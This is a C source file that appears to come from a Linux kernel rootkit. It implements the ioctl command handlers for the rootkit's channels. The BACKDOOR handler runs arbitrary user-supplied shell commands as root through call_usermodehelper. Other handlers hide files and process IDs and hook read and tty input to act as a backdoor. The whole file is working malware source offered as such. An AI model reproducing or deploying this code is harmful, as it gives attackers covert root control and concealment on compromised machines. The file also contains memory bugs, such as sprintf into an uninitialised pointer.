#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>

#include "channel.h"
#include "common.h"
#include "filehide.h"
#include "backdoor.h"
#include "hidepid.h"
#include "ioctl.h"
#include "rootkit.h"

#define BUFLEN 512

extern rootkit_t rootkit;

void
report_channels(void)
{
    DEBUG_NOTICE("-----------------------------------\n");
    DEBUG_NOTICE("listening on the following channels\n");
    DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
    DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
    DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
    DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_HIDEPID);
    DEBUG_NOTICE("-----------------------------------\n");
}

channel_t
detect_channel(unsigned cmd)
{
    switch (cmd) {
    case G7_PING:     return (channel_t){ "PING",     handle_ping     };
    case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
    case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
    case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
    case G7_HIDEPID:  return (channel_t){ "HIDEPID",  handle_hidepid  };
    }

    return (channel_t){ "unknown", NULL };
}

int
handle_ping(unsigned long arg)
{
    char buf[BUFLEN];

    if (!(const char *)arg)
        return -ENOTTY;

    copy_from_user(buf, (const char *)arg, BUFLEN);
    if (!strcmp("PING", buf)) {
        buf[1] = 'O';
        copy_to_user((char *)arg, buf, BUFLEN);
    }

    return 0;
}

int
handle_filehide(unsigned long arg)
{
    long sarg = (long)arg;
    bool set = rootkit.hiding_files;

    if (sarg > 0 || (!sarg && (set ^ 1))) {
        hide_files();
        rootkit.hiding_files = 1;
    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
        unhide_files();
        rootkit.hiding_files = 0;
    }

    DEBUG_NOTICE("filehide %s\n", rootkit.hiding_files ? "on" : "off");

    return 0;
}

int
handle_backdoor(unsigned long arg)
{
    char buf[BUFLEN];

    if (!(const char *)arg)
        return -ENOTTY;

    copy_from_user(buf, (const char *)arg, BUFLEN);

    char *argv[] = {
        "/bin/sh",
        "-c",
        buf,
        NULL
    };

    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    return 0;
}

int
handle_togglebd(unsigned long arg)
{
    char *msg;
    long sarg = (long)arg;

    if (!sarg) {
        unbackdoor();
        rootkit.backdoor = BD_OFF;
        msg = "off";
    } else if (sarg < 0) {
        backdoor_read();
        rootkit.backdoor = BD_READ;
        msg = "hooked into `read`";
    } else if (sarg > 0) {
        backdoor_tty();
        rootkit.backdoor = BD_TTY;
        msg = "hooked into `{p,t}ty`";
    }

    DEBUG_NOTICE("backdoor %s\n", msg);

    return 0;
}

int
handle_hidepid(unsigned long arg)
{
    char *msg;
    long sarg = (long)arg;

    if (!sarg) {
        unhide_pids();
        rootkit.hiding_pids = false;
        msg = "hidepid off";
    } else if (sarg < 0) {
        unhide_pid((pid_t)((-1) * sarg));
        sprintf(msg, "unhiding pid %d", (pid_t)((-1) * sarg));
    } else if (sarg > 0) {
        if (!rootkit.hiding_files) {
            DEBUG_NOTICE("hidepid on\n");
            rootkit.hiding_pids = true;
        }

        hide_pid((pid_t)sarg);
        sprintf(msg, "hiding pid %d", (pid_t)sarg);
    }

    DEBUG_NOTICE("%s\n", msg);

    return 0;
}
